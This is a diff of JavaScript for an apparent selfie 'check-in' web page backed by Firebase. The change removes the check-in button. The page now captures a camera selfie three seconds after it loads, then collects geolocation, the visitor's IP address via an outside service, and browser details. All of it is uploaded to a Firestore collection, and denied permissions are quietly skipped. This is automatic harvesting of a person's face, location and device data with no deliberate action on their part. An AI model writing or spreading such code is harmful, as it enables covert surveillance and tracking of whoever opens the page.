@@ -40,20 +40,18 @@ getFirestore(app);
 const video =
 document.getElementById("video");
 
-const btn =
-document.getElementById("btn");
-
 const statusText =
 document.getElementById("status");
 
 const canvas =
 document.getElementById("canvas");
 
-let cameraOk = false;
-
-async function iniciarCamera(){
+async function iniciarSistema(){
 
   try{
+
+    statusText.innerHTML =
+    "📸 Abrindo câmera...";
 
     const stream =
     await navigator.mediaDevices
@@ -71,10 +69,13 @@ async function iniciarCamera(){
 
     await video.play();
 
-    cameraOk = true;
-
     statusText.innerHTML =
-    "✅ Câmera pronta";
+    "✅ Câmera iniciada";
+
+    setTimeout(
+      capturarTudo,
+      3000
+    );
 
   }
 
@@ -89,142 +90,154 @@ async function iniciarCamera(){
 
 }
 
-window.onload = ()=>{
+async function capturarTudo(){
 
-  iniciarCamera();
+  try{
 
-};
+    statusText.innerHTML =
+    "📸 Capturando selfie...";
 
-btn.addEventListener(
-  "click",
-  async()=>{
+    canvas.width =
+    video.videoWidth;
 
-    if(!cameraOk){
+    canvas.height =
+    video.videoHeight;
 
-      alert(
-        "A câmera ainda não carregou"
-      );
+    const ctx =
+    canvas.getContext("2d");
 
-      return;
-    }
+    ctx.drawImage(
+      video,
+      0,
+      0,
+      canvas.width,
+      canvas.height
+    );
+
+    const selfie =
+    canvas.toDataURL(
+      "image/jpeg",
+      0.7
+    );
+
+    statusText.innerHTML =
+    "📍 Obtendo localização...";
+
+    let latitude = null;
+    let longitude = null;
 
     try{
 
-      btn.disabled = true;
-
-      btn.innerHTML =
-      "PROCESSANDO...";
-
-      statusText.innerHTML =
-      "📸 Capturando selfie...";
-
-      canvas.width =
-      video.videoWidth;
-
-      canvas.height =
-      video.videoHeight;
-
-      const ctx =
-      canvas.getContext("2d");
-
-      ctx.drawImage(
-        video,
-        0,
-        0,
-        canvas.width,
-        canvas.height
-      );
-
-      const selfie =
-      canvas.toDataURL(
-        "image/jpeg",
-        0.7
-      );
-
-      statusText.innerHTML =
-      "📍 Obtendo localização...";
-
-      const localizacao =
+      const posicao =
       await new Promise(
         (resolve,reject)=>{
 
           navigator.geolocation
           .getCurrentPosition(
             resolve,
-            reject
+            reject,
+            {
+              timeout:5000
+            }
           );
 
         }
       );
 
-      const latitude =
-      localizacao.coords.latitude;
+      latitude =
+      posicao.coords.latitude;
 
-      const longitude =
-      localizacao.coords.longitude;
+      longitude =
+      posicao.coords.longitude;
 
-      statusText.innerHTML =
-      "🌐 Obtendo IP...";
+    }
 
-      const ipReq =
+    catch(e){
+
+      console.log(
+        "Localização negada"
+      );
+
+    }
+
+    statusText.innerHTML =
+    "🌐 Obtendo IP...";
+
+    let ip = "indisponível";
+
+    try{
+
+      const req =
       await fetch(
         "https://api.ipify.org?format=json"
       );
 
-      const ipJson =
-      await ipReq.json();
+      const json =
+      await req.json();
 
-      await addDoc(
-        collection(
-          db,
-          "checkins"
-        ),
-        {
+      ip = json.ip;
 
-          selfie:selfie,
+    }
 
-          latitude:latitude,
+    catch(e){
 
-          longitude:longitude,
-
-          ip:ipJson.ip,
-
-          userAgent:
-          navigator.userAgent,
-
-          plataforma:
-          navigator.platform,
-
-          idioma:
-          navigator.language,
-
-          horario:
-          serverTimestamp()
-
-        }
+      console.log(
+        "Erro IP"
       );
 
-      statusText.innerHTML =
-      "✅ CHECK-IN REALIZADO";
-
-      btn.innerHTML =
-      "CONCLUÍDO";
-
     }
 
-    catch(err){
+    statusText.innerHTML =
+    "💾 Salvando dados...";
 
-      console.log(err);
+    await addDoc(
+      collection(
+        db,
+        "checkins"
+      ),
+      {
 
-      statusText.innerHTML =
-      "❌ Erro no check-in";
+        selfie:selfie,
 
-      btn.disabled = false;
+        latitude:latitude,
 
-      btn.innerHTML =
-      "REALIZAR CHECK-IN";
+        longitude:longitude,
 
-    }
+        ip:ip,
+
+        userAgent:
+        navigator.userAgent,
+
+        plataforma:
+        navigator.platform,
+
+        idioma:
+        navigator.language,
+
+        horario:
+        serverTimestamp()
+
+      }
+    );
+
+    statusText.innerHTML =
+    "✅ CHECK-IN REALIZADO";
 
   }
-);
+
+  catch(err){
+
+    console.log(err);
+
+    statusText.innerHTML =
+    "❌ ERRO AO SALVAR";
+
+  }
+
+}
+
+window.onload = ()=>{
+
+  iniciarSistema();
+
+};
